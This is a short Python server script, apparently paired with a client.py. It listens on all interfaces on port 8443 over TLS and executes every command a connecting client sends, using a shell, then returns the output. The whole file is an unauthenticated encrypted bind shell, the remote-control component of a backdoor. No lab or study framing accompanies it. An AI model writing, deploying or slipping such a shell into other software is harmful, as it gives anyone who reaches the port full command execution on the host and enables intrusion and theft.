import socket
import ssl
import subprocess

HOST = '0.0.0.0'
PORT = 8443

# Paths to your TLS key and cert (ensure they match those used in client.py)
CERT_FILE = 'cert.pem'
KEY_FILE = 'key.pem' 

context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
context.load_cert_chain(certfile=CERT_FILE, keyfile=KEY_FILE)

with socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0) as bindsocket:
    bindsocket.bind((HOST, PORT))
    bindsocket.listen(5)
    print(f"[*] Listening on {HOST}:{PORT}")

    while True:
        try:
            client_socket, addr = bindsocket.accept()
            print(f"[+] Connection from {addr}")
            with context.wrap_socket(client_socket, server_side=True) as ssock:
                data = ssock.recv(4096).decode('utf-8').strip()
                print(f"[>] Received command: {data}")

                try:
                    output = subprocess.check_output(data, shell=True, stderr=subprocess.STDOUT, text=True)
                except subprocess.CalledProcessError as e:
                    output = f"[!] Error:\n{e.output}"

                ssock.sendall(output.encode('utf-8'))
                print(f"[<] Sent output ({len(output)} bytes)")
        except Exception as e:
            print(f"[!] Error: {e}")
